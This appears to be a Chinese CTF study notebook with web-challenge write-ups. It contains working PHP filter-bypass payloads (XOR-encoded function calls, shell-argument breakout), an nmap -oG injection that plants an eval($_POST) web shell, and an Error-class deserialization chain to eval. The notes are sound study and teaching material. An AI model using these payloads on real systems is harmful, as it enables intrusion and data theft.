a=0x9c,b=0x96,c=0x9c,d=0x96
a=0x8f,b=0x8f,c=0x96,d=0x96
a=0x8f,b=0x96,c=0x8f,d=0x96
a=0x9e,b=0x9e,c=0x96,d=0x96
a=0x9e,b=0x96,c=0x9e,d=0x96
a=0xd1,b=0xd1,c=0x96,d=0x96
a=0xd1,b=0x96,c=0xd1,d=0x96
a=0x96,b=0x9b,c=0x9b,d=0x96
a=0x96,b=0xa0,c=0xa0,d=0x96
a=0x96,b=0x9c,c=0x9c,d=0x96
a=0x96,b=0x8f,c=0x8f,d=0x96
a=0x96,b=0x9e,c=0x9e,d=0x96
a=0x96,b=0xd1,c=0xd1,d=0x96
a=0x96,b=0x8c,c=0x8c,d=0x96
a=0x8c,b=0x96,c=0x8c,d=0x96
a=0x8c,b=0x8c,c=0x96,d=0x96
a=0x9c,b=0x8f,c=0x9e,d=0x8d
a=0x9c,b=0x9e,c=0x8f,d=0x8d
a=0x8f,b=0x9c,c=0x9e,d=0x8d
a=0x8f,b=0x9e,c=0x9c,d=0x8d
a=0x9e,b=0x9c,c=0x8f,d=0x8d
a=0x9e,b=0x8f,c=0x9c,d=0x8d
a=0x9b,b=0x9b,c=0x8c,d=0x8c
a=0x9b,b=0x8c,c=0x9b,d=0x8c
a=0xa0,b=0xa0,c=0x8c,d=0x8c
a=0xa0,b=0x8c,c=0xa0,d=0x8c
a=0x9c,b=0x9c,c=0x8c,d=0x8c
a=0x9c,b=0x8c,c=0x9c,d=0x8c
a=0x8f,b=0x8f,c=0x8c,d=0x8c
a=0x8f,b=0x8c,c=0x8f,d=0x8c
a=0x9e,b=0x9e,c=0x8c,d=0x8c
a=0x9e,b=0x8c,c=0x9e,d=0x8c
a=0xd1,b=0xd1,c=0x8c,d=0x8c
a=0xd1,b=0x8c,c=0xd1,d=0x8c
a=0x96,b=0x96,c=0x8c,d=0x8c
a=0x96,b=0x8c,c=0x96,d=0x8c
a=0x8c,b=0x9b,c=0x9b,d=0x8c
a=0x8c,b=0xa0,c=0xa0,d=0x8c
a=0x8c,b=0x9c,c=0x9c,d=0x8c
a=0x8c,b=0x8f,c=0x8f,d=0x8c
a=0x8c,b=0x9e,c=0x9e,d=0x8c
a=0x8c,b=0xd1,c=0xd1,d=0x8c
a=0x8c,b=0x96,c=0x96,d=0x8c
11 [139, 155, 160, 156, 143, 145, 158, 209, 150, 141, 140]



=>
a = c^p^r
d = s^c^t
n = i^s^t

所以
print_r(scandir(.))
可以表示为：
((%8f%8d%96%96%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%8c%ff%ff%ff)^(%ff%ff%ff%8b%ff%ff%ff))(((%8c%9c%9c%96%8c%96%8d)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%8f%8c%9c%ff%ff)^(%ff%ff%8d%8b%8b%ff%ff))(%d1^%ff));


未修改前：
((%8F%8D%96%91%8B%A0%8D)^(%ff%ff%ff%ff%ff%ff%ff))(((%8C%9C%9E%91%9B%96%8D)^(%ff%ff%ff%ff%ff%ff%ff))(%D1^%ff));


返回
Array ( [0] => . [1] => .. [2] => index.php [3] => n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt 
       
 
```

​      然后再利用 end() 与 readfile()/show_source()

构造

readfile(end(scandir(.)))/show_source(end(scandir(.)))

与上同理

```python
result2 = [160, 136, 138, 140, 141, 144, 145, 209, 150, 151, 154, 155, 156, 158]  # Original chars,14 total
result = [160, 136, 141, 209, 151, 154, 155, 156]
temp = []
for d in result2:
    for a in result:
        for b in result:
            for c in result:
                if (a ^ b ^ c == d):
                    if (a == b == c == d) or (a==b) or (b==c) or (c==d) or(a==c):
                        continue
                    else:
                        print("a=0x%x,b=0x%x,c=0x%x,d=0x%x" % (a, b, c, d))
                        if d not in temp:
                            temp.append(d)
print(len(temp), temp)


r = s^d^e
f = c^l^i
n = c^l^a

<?php
$dic = 'd e l a';
$arr1 = explode(' ', $dic);
foreach ($arr1 as $key => $value) {
    echo "$value = ".urlencode($value ^ urldecode('%ff'))."</br>";
}

d = %9B
e = %9A
l = %93
a = %9E

最后paylaoda
((%8c%9a%9e%9b%9c%96%93%9a)^(%ff%ff%ff%ff%ff%ff%ff%ff)^(%9b%ff%ff%ff%93%ff%ff%ff)^(%9a%ff%ff%ff%96%ff%ff%ff))(((%9a%9c%9b)^(%ff%ff%ff)^(%ff%93%ff)^(%ff%9e%ff))(((%8c%9c%9e%9c%9b%96%8c)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%93%ff%ff%9b)^(%ff%ff%ff%9e%ff%ff%9a))(%d1^%ff)));
```

只能说这题贼鸡儿麻烦

### [BMZCTF] EasyBtpass

```php
<?php

highlight_file(__FILE__);

$comm1 = $_GET['comm1'];
$comm2 = $_GET['comm2'];


if(preg_match("/\'|\`|\\|\*|\n|\t|\xA0|\r|\{|\}|\(|\)|<|\&[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is", $comm1))
    $comm1 = "";
if(preg_match("/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|<|\&[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is", $comm2))
    $comm2 = "";

$flag = "#flag in /flag";

$comm1 = '"' . $comm1 . '"';
$comm2 = '"' . $comm2 . '"';

$cmd = "file $comm1 $comm2";
system($cmd);
?>
    
    
  $flag 告诉我们flag在 /flag
    然后看到$cmd 中的file命令  即打开文件
    
    ?comm1=index.php&comm2=
    返回 
    index.php: PHP script, ASCII text : cannot open `' (No such file or directory)'
    这里因为comm1过滤的少 所以直接利用comm1进行命令执行
     ?comm1=index.php"tac /fl*;"&comm2=  
       返回
      index.phptac: cannot open `index.phptac' (No such file or directory) /flag: ASCII text  '
      说明没有闭合
          ?comm1=index.php;"tac /fl*;"&comm2=
          返回
          index.php;tac: cannot open `index.php;tac' (No such file or directory) /flag: ASCII text'
          所以最后的payload为
              ?comm1=index.php";tac /fl*;"&comm2=
```

### [BUUCTF 2018]Online Tool

这题是根本不会

https://mochazz.github.io/2018/07/30/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day5%20-%20escapeshellarg%E4%B8%8Eescapeshellcmd%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93/#%E5%89%8D%E8%A8%80

学到了

https://noahtie.github.io/2021/04/27/escapeshell&escapecmd%E6%BC%8F%E6%B4%9E/

同时也不是很了解nmap的命令

| **输出参数**           |                                                              |      |
| ---------------------- | ------------------------------------------------------------ | ---- |
| -oN/-oX/-oS/-oG <file> | 将normal、XML、s \|<rIpt kIddi3和greable格式的扫描输出到给定的文件名。 |      |

只能说学到很多



## 3.16

### [网鼎杯 2020 朱雀组]Nmap

输入 

127.0.01 | ls;

回显

```
127.0.0.1 \| ls \;
```

与上题一样的考点

直接用上题的payload

```
' <?php @eval($_POST["hack"]);?> -oG hack.php '
```

返回 hacker

看了wp是过滤了php

结合短标签与phtml

```
' <?= @eval($_POST["hack"]);?> -oG hack.phtml '
```

成功

访问后蚁剑链接根目录查找flag



### [CISCN2019 华北赛区 Day1 Web1]Dropbox

https://xz.aliyun.com/t/2715

https://www.jianshu.com/p/5b91e0b7f3ac

https://mayi077.gitee.io/2020/02/03/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/



这题只能说是纯看wp了

拿到源码后自己申出需要class.php中的file_get_contens来读取文件

但是对于具体的过程还是不是很懂

**总结**



1. 这里对于phar反序列化应该注意到几点

1）phar文件要能够上传至服务器

2）要有可用的魔术方法为跳板

3）文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤

有魔术方法但是没有unserialize就要往phar反序列化这方面想了

2. 对于代码审计的题目拿到后还是不知道该怎么开始申  好几个文件有点没有头绪的感觉  刚好这篇wp里也提到了  先审class.php config.php function.php这种
3. 既然是代码审计的多文件  各文件的某些细节都要注意  可能某句代码都会成为解题的突破口
4. 对于代码审计的题目或许可以放到seay源码审计里一把梭看看能不能给点思路呢

其实看到wp感觉总体还是不是很难 但是有一些小细节需要注意

懒得去整理了 （因为是在都是看的wp了）

## 3.17

### [极客大挑战 2020]Greatphp

原生类反序列化

```php
<?php
error_reporting(0);
class SYCLOVER {
    public $syc;
    public $lover;

    public function __wakeup(){
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
           if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
               eval($this->syc);
           } else {
               die("Try Hard !!");
           }
           
        }
    }
}

if (isset($_GET['great'])){
    unserialize($_GET['great']);
} else {
    highlight_file(__FILE__);
}

?>				
```







```php
<?php
 
class SYCLOVER {
    public $syc;
    public $lover;
    public function __wakeup(){
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
           if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
               eval($this->syc);
           } else {
               die("Try Hard !!");
           }
 
        }
    }
}
 
$str = "?><?=include~".urldecode("%D0%99%93%9E%98")."?>";
/* 
或使用[~(取反)][!%FF]的形式，
即: $str = "?><?=include[~".urldecode("%D0%99%93%9E%98")."][!.urldecode("%FF")."]?>";    
 
$str = "?><?=include $_GET[_]?>"; 
*/
$a=new Error($str,1);$b=new Error($str,2);
$c = new SYCLOVER();
$c->syc = $a;
$c->lover = $b;
echo(urlencode(serialize($c)));
 
?>
```

$str中的?>是为了闭合前面 

之前只知道Error能构造xss

这个用法还是第一次知道

记住就行了 没啥好说的- -

https://johnfrod.top/ctf/2020-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98greatphp/





### [SUCTF 2019]Upload Labs2（留坑 过段时间记得做）



https://xz.aliyun.com/t/6057



### [红明谷CTF 2021]write_shell 

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
function check($input){
    if(preg_match("/'| |_|php|;|~|\\^|\\+|eval|{|}/i",$input)){
        // if(preg_match("/'| |_|=|php/",$input)){
        die('hacker!!!');
    }else{
        return $input;
    }
}

function waf($input){
  if(is_array($input)){
      foreach($input as $key=>$output){
          $input[$key] = waf($output);
      }
  }else{
      $input = check($input);
  }
}

$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
if(!file_exists($dir)){
    mkdir($dir);
}
switch($_GET["action"] ?? "") {
    case 'pwd':
        echo $dir;
        break;
    case 'upload':
        $data = $_GET["data"] ?? "";
        waf($data);
        file_put_contents("$dir" . "index.php", $data);
}
?>
```

由题

action=pwd输出所写文件目录

action=upload对于所输入的代码进行过滤后写入该文件

可以直接利用段标签加反引号绕过

```
<?=`ls%09/`?>
然后访问action=pwd时给出的文件目录
最后
<?=`tac%09fl*`?>
即可得到flag

```

#### 无字母数字webshell总结

https://xz.aliyun.com/t/8107#toc-11

https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html

https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html

## 3.18

